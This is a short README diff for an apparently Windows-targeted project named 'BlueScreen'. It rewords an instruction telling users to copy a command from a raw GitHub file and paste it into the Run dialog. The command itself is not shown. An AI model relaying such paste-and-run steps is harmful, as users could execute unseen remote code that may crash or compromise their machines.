@@ -1,4 +1,4 @@
-# Simply press win + r and copy the command [here](https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/command.txt) to get started!
+# Simply copy the command [here,](https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/command.txt) then press the windows key and paste the command to get started!
 <br>
 
 [Alpha Version (sometimes untested and unstable)](https://github.com/harryaldwithjarryald/BlueScreen/archive/refs/heads/main.zip)
